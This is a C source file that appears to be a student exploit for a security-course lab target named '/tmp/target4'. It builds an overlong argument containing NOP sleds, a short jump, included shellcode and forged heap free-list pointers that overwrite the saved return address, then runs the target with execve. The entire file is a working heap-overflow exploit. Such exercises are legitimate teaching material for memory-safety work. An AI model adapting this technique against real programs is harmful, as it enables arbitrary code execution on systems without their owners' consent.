#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
 
#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  
  args[1] = malloc(1024);
  
  int i = 0;

  //left pointer [will jump to right]
  args[1][i++] = 0x90;
  args[1][i++] = 0x90;
  args[1][i++] = 0xeb;
  args[1][i++] = 0x03;
  
  //right pointer [passes GET_FREEBIT]
  args[1][i++] = 0x4d;
  args[1][i++] = 0xfa;
  args[1][i++] = 0xff;
  args[1][i++] = 0xbf;
  
  //data section [add nops before shellcode]
  for(i = i; i < 504 - strlen(shellcode); i++) {
    args[1][i] = 0x90;
  }
  
  //data section [add shellcode]
  for(i = i; i < 504; i++) {
    args[1][i] = shellcode[i - 504 + strlen(shellcode)];
  }
  
  //left pointer [potential &shellcode]
  args[1][i++] = 0x48;
  args[1][i++] = 0x9a;
  args[1][i++] = 0x04;
  args[1][i++] = 0x08;
  
  //right pointer [&eip]
  args[1][i++] = 0x4c;
  args[1][i++] = 0xfa;
  args[1][i++] = 0xff;
  args[1][i++] = 0xbf;
  
  //data section [add nops]
  for(i = i; i < 1023; i++) {
    args[1][i] = 0x90;
  }
  
  //data section [add null terminator]
  args[1][i++] = 0x00;
  
 
  args[0] = TARGET;
  args[2] = NULL;
  env[0] = NULL;
 
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
 
  return 0;
}